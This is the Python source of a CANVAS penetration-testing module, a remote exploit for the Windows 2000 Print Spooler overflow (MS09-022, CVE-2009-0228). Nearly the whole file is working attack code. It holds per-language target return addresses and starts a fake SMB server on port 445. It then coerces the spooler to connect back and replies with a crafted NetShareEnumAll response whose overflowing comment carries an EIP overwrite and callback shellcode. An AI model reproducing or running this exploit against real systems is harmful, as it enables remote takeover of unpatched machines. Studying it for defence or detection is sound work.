#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket
import time
import struct

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

NAME = 'Microsoft Windows Print Spooler Overflow'
DESCRIPTION = 'Microsoft Windows Print Spooler Overflow'
DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'Microsoft'
DOCUMENTATION['Date public'] = '06/09/09'
DOCUMENTATION['References'] = 'http://www.microsoft.com/technet/security/bulletin/ms09-022.mspx'
DOCUMENTATION['Repeatability'] = 'One shot'
DOCUMENTATION['CVE Name'] = 'CVE-2009-0228'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0228'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Note'] = 'A string is non-zero terminated after a wcsncpy(), ending up in a miscalculation before a wcsncat(). This is kind of like an uninitialized variable issue, and thus reliable code execution depends on the content of the stack. This version of the exploit triggers the bug, bur will be not be extremely reliable. This exploit requires "root" privileges since it starts a fake SMB server on TCP port 445. There is a 4-byte difference in the stack layout if MS08-062 is not installed, making the exploit fail.'

VERSION = '1.0'
PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000']
PROPERTY['MSADV'] = 'MS09-022'

CHANGELOG="""
KK 06/10/09: Added testOS(), automatic language selection, French target
"""

NOTES="""
Usage:
./commandlineInterface.py -v 1 -p 5555
sudo ./exploits/ms09_022/ms09_022.py -t 10.10.10.224 -v 1 -l 10.10.10.236 -d 5555
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000 SP4 English',0x001f5028,'W\0i\0n\0d\0o\0w\0s\0 \0N\0T\0 \0R\0e\0m\0o\0t\0e\0 \0P\0r\0i\0n\0t\0e\0r\0s\0'], #jmp esp
    2: ['Windows 2000 SP4 French',0x001f5028,'I\0m\0p\0r\0i\0m\0a\0n\0t\0e\0s\0 \0d\0i\0s\0t\0a\0n\0t\0e\0s\0 \0p\0o\0u\0r\0 \0W\0i\0n\0d\0o\0w\0s\0 \0N\0T\0'],
}

def encodeString(ss):
    return struct.pack('>H', len(ss)) + ss

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.port           = 445
        self.version        = 0
        self.badstring      = '\0\xff'
        self.myDCE          = None
        self.connectionList = []
        self.subesp         = 0
        self.covertness     = 0
        self.providor       = ''
        self.setSubVersions() #automatically sets some variables for some common versions/languages
        self.langdict2000   = {}


    def setSubVersions(self):
        self.langdict2000={}
        for v in targets:
            d=targets[v]
            if d[0].count('2000')>0:
                l=d[0].split(' ')[-1]
                for s in l.split(','):
                    s=s.replace('+',' ')
                    self.langdict2000[s]=v

    def createShellcode(self):
        self.shellcode=self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def test(self):
        self.getArgs()
        if self.connect():
            if self.version != 0:
                return self.testOS()
            else:
                return 1

        self.log('Test failed')
        return 0

    def testOS(self):
        if self.version != 0:
            return 1
        
        self.version = 0
        app = self.engine.getModuleExploit('osdetect')
        app.link(self)

        if app.run() == 0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        myos = app.result
        
        self.log('OS Found: %s' % (myos))
        
        if not myos.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                myos.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if myos.version=='2000':
            self.log('Attacking Windows 2000 language: %s'%(myos.language))
            if myos.language in self.langdict2000.keys():
                self.version=self.langdict2000[myos.language]
                return 1
            else:
                return 0
        else:
            self.log('OS not vulnerable: %s'%(myos))
        return 0

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version', self.version))
        return

    def connect(self):
        connectionList=self.buildConnectionList()
        res = None        
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")
        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            try:
                self.myDCE=libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                            frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote service')
            return 0
        
        self.log('Attacking %s' % self.host)
        return 1
    
    def buildConnectionList(self):
        self.UUID='12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion='1.0'
        self.connectionList=['ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def EnumPrintersW(self):
        self.log('Requesting Share Enumeration for %s'%(self.callback.ip))
        packet=intel_order(8)
        packet+=intel_order(1)
        name='!!\\\\%s'%(self.callback.ip)
        name=name.encode('UTF-16')[2:]
        name=self.providor+name
        packet+=s_dce_raw_unistring(name)
        packet+=intel_order(1)
        packet+=intel_order(0)
        packet+=intel_order(0)
        self.myDCE.call(0x0, packet, response=False)
        return 1

    def recvall(self,s):
        data=s.recv(4)
        if len(data)<4: #should never happen
            return ''
        data+=s.recv((struct.unpack('>L',data)[0])&0x00ffffff) #only 3 bytes
        return data

    def handleSMBclient(self,s,eip):
        """Handles a SMB client connection"""
        request=self.recvall(s)
        #Negotiate Protocol Request
        if len(request)<9 or request[4:8]!='\xffSMB' or ord(request[8])!=0x72:
            self.log('Unexpected packet received instead of "Negotiate Protocol Request"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Negotiate Protocol Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0055)+'\xffSMB'+struct.pack('<BL',0x72,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc853,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0000,muxid)
        response+=struct.pack('<BHBHHLLL',0x11,0x0005,0x03,0x000a,0x0001,0x00001104,0x00010000,0x00000000)
        response+=struct.pack('<LLLHBH',0x8000e3fd,0x00000000,0x00000000,0x0168,0x00,0x0010)+'\xff'*0x10
        s.sendall(response)
        request=self.recvall(s)
        #Session Setup AndX Request, NTLMSSP_NEGOTIATE
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x73:
            self.log('Unexpected packet received instead of "Session Setup AndX Request, NTLMSSP_NEGOTIATE"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Session Setup AndX Response, NTLMSSP_CHALLENGE, Error: STATUS_MORE_PROCESSING_REQUIRED
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x011d)+'\xffSMB'+struct.pack('<BL',0x73,0xc0000016)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0800,muxid)
        response+=struct.pack('<BBBHH',0x04,0xff,0x00,0x011d,0x0000)
        response+=struct.pack('<HH',0x00a8,0x00f2)+'NTLMSSP\0'+struct.pack('<L',0x00000002)
        response+=struct.pack('<HHL',0x0014,0x0014,0x00000030)+struct.pack('<L',0xe08a8215)+'\0'*16
        response+=struct.pack('<HHL',0x0064,0x0064,0x00000044)+'FAKESMBSRV'.encode('UTF-16')[2:]
        response+=struct.pack('<HH',0x0002,0x0014)+'FAKESMBSRV'.encode('UTF-16')[2:]
        response+=struct.pack('<HH',0x0001,0x0014)+'FAKESMBSRV'.encode('UTF-16')[2:]
        response+=struct.pack('<HH',0x0004,0x0014)+'fakesmbsrv'.encode('UTF-16')[2:]
        response+=struct.pack('<HH',0x0003,0x0014)+'fakesmbsrv'.encode('UTF-16')[2:]
        response+=struct.pack('<L',0x00000000)
        if len(response)%2!=0:
            response+='\0'
        response+='Windows 5.0'.encode('UTF-16')[2:]+'\0\0'
        response+='Windows 2000 LAN Manager'.encode('UTF-16')[2:]+'\0'
        s.sendall(response)
        request=self.recvall(s)
        #Session Setup AndX Request, NTLMSSP_AUTH, User: ???
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x73:
            self.log('Unexpected packet received instead of "Session Setup AndX Request, NTLMSSP_AUTH, User: ???"')
            return
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Session Setup AndX Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0075)+'\xffSMB'+struct.pack('<BL',0x73,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x04,0xff,0x00,0x0075)
        response+=struct.pack('<HHHB',0x0000,0x0000,0x004a,0x4e)
        response+='Windows 5.0'.encode('UTF-16')[2:]+'\0\0'
        response+='Windows 2000 LAN Manager'.encode('UTF-16')[2:]+'\0'
        s.sendall(response)
        request=self.recvall(s)
        #Tree Connect AndX Request, Path: ???
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x75:
            self.log('Unexpected packet received instead of "Tree Connect AndX Request, Path: ???"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Tree Connect AndX Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0038)+'\xffSMB'+struct.pack('<BL',0x75,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,0xfeff,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x07,0xff,0x00,0x0038)
        response+=struct.pack('<HHHHHH',0x0001,0x01ff,0x0000,0x01ff,0x0000,0x0007)+'IPC'+'\0'*4
        s.sendall(response)
        request=self.recvall(s)
        #NT Create AndX Request, Path: \srvsvc
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0xa2:
            self.log('Unexpected packet received')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #NT Create AndX Response, FID: 0x4000
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0087)+'\xffSMB'+struct.pack('<BL',0xa2,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,0x01a4,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x2a,0xff,0x00,0x0087)
        response+=struct.pack('<BHL',0x00,0x4000,0x00000001)+'\0'*32 #fid
        response+=struct.pack('<LLL',0x00000080,0x00001000,0x00000000)+'\0'*8
        response+=struct.pack('<HHBH',0x0002,0x05ff,0x00,0x0000)
        response+=struct.pack('<HHL',0x0014,0x0014,0x00000076)
        response+=struct.pack('<HHL',0x0010,0x0010,0x000000ba)
        response+=struct.pack('<LHHHHHH',0xe2888215,0x0005,0x01ff,0x001f,0x01fb,0x0012,0x004f) #unknown
        s.sendall(response)
        request=self.recvall(s)
        #DCERPC Bind: call_id: 1 SRVSVC V3.0
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "DCERPC Bind: call_id: 1 SRVSVC V3.0"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #DCERPC Bind_ack: call_id: 1 accept max_xmit: 4280 max_recv: 4280
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x007c)+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0044,0x0000,0x0000,0x0038,0x0000,0x0044,0x0038,0x0000,0x00,0x00,0x0045,0x00)
        response+=struct.pack('<BBBBLHHLHH',0x05,0x00,0x0c,0x03,0x00000010,0x0044,0x0000,callid,0x10b8,0x10b8)
        response+=struct.pack('<LH',0x000064fd,0x000d)+'\\PIPE\\ntsvcs\0\0'+struct.pack('<LL',0x00000001,0x00000000)
        response+=struct.pack('<LHHBBBBBBBBL',0x8a885d04,0x1ceb,0x11c9,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x00000002)
        s.sendall(response)
        request=self.recvall(s)
        #SRVSVC NetShareEnumAll request
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SRVSVC NetShareEnumAll request"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SRVSVC NetShareEnumAll response
        comment=''
        comment+='B'*0x20
        comment+=struct.pack('<L',0xfffffffc)
        comment+='CCCC'
        comment+=struct.pack('<L',self.eip)
        comment+='DDDD'
        comment+=struct.pack('<L',0x7ffdf204)
        comment+='E'*0xc
        comment+=struct.pack('<L',0x7ffdf1e4) #0x7ffdf1e0 points to 'Service Pack 4'
        comment+=struct.pack('<L',0x01010101)
        comment+=struct.pack('<L',0x7ffdf0ac)
        comment+='FFFF'
        comment+='G'*0xc
        comment+=self.shellcode
        if (len(comment)%2)!=0:
            comment+='\xcc'
        data=''
        data+=struct.pack('<L',1)
        data+=struct.pack('<L',1)
        data+=struct.pack('<L',1) #[unique]
        data+=struct.pack('<L',6)
        data+=struct.pack('<L',2) #[unique]
        data+=struct.pack('<L',6)
        data+=struct.pack('<LLL',3,0x80000003,4) #[unique],type,[unique]
        data+=struct.pack('<LLL',5,0x00000000,6) #[unique],type,[unique]
        data+=struct.pack('<LLL',7,0x00000001,8) #[unique],type,[unique]
        data+=struct.pack('<LLL',9,0x80000000,10) #[unique],type,[unique]
        data+=struct.pack('<LLL',11,0x80000000,12) #[unique],type,[unique]
        data+=struct.pack('<LLL',13,0x00000000,14) #[unique],type,[unique]
        data+=s_dce_win2k_unistring('IPC$')
        data+=s_dce_win2k_unistring('Remote IPC')
        data+=s_dce_win2k_unistring('print$')
        data+=s_dce_win2k_unistring('Printer Drivers')
        data+=s_dce_win2k_unistring('A'*0x207) #wcsncpy() is 0x207 cch long
        data+=s_dce_raw_unistring(comment)
        data+=s_dce_win2k_unistring('ADMIN$')
        data+=s_dce_win2k_unistring('Remote Admin')
        data+=s_dce_win2k_unistring('C$')
        data+=s_dce_win2k_unistring('Default share')
        data+=s_dce_win2k_unistring('Shared')
        data+=s_dce_win2k_unistring('')
        data+=struct.pack('<LLL',6,0,0)
        #SMB Pipe TransactNmPipe Response, FID: 0x4000
        self.log('Sending 1st fragment of NetShareEnumAll response')
        #Fragment 1
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0438)+'\xffSMB'+struct.pack('<BL',0x25,0x80000005)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0400,0x0000,0x0000,0x0038,0x0000,0x0400,0x0038,0x0000,0x00,0x00,0x0401,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x0018+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data[:0x400-0x18]
        s.sendall(response)
        request=self.recvall(s)
        #SMB Read AndX Request, FID: 0x4000, ??? bytes at offset 0
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x2e:
            self.log('Unexpected packet received instead of "SMB Read AndX Request, FID: 0x4000, ??? bytes at offset 0"')
            return False
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        # XXX
        self.log('Sending 2nd fragment of NetShareEnumAll response')
        #Fragment 2
        remaining=data[0x400-0x18:]
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x48+len(remaining))+'\xffSMB'+struct.pack('<BL',0x2e,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBHHHHHHL',0x0c,0xff,0x00,0x0000,0x0000,0x0000,0x0000,len(remaining),0x003c,0x00000000)
        response+='\0'*6+struct.pack('<HB',len(remaining)+1,0x00)
        response+=data[0x400-0x18:]
        s.sendall(response)
        request=self.recvall(s)
        #XXX: sleep instead of recvall
        return True

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)

        smb_s = self.gettcpsock()
        smb_s.set_timeout(15) #15 seconds timeout on accept/recv

        try: # AttributeError on Windows, no setsockopt
            smb_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except:
            pass

        try:
            smb_s.bind(('', 445))
        except socket.error,err:
            self.log("Couldn't bind on port 445/tcp: %s"%(err))
            return False
        smb_s.listen(1)
        self.log('Fake SMB server successfully started!')
        self.setProgress(25)
        try:
            self.log('Connecting...')
            self.connect()
            self.log('Testing for OS')
            if not self.testOS() or self.version==0:
                raise Exception,'OS detection failed.'
            self.info,self.eip,self.providor=targets[self.version]
            self.setProgress(50)
            self.EnumPrintersW()
            c,address=smb_s.accept()
            self.log('Got new connection from %s:%d'%(address))
            self.setProgress(75)
            if self.handleSMBclient(c,self.eip)!=True:
                self.log('Some error occured when handling the client connection')
            c.close()
            smb_s.close()
            self.setProgress(100)
        except Exception,msg:
            self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
            if str(msg).count('10061'):
                msg='Connection refused'
            self.log('Failed reason: %s'%(prettyprint(str(msg))))
            return 0
        time.sleep(5)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%(self.name))
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%(self.name))
        return 0

    def usage(self):
        print 'Usage: %s -t host -l localIP -d localPort [-T: testmode]'%(sys.argv[0])
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
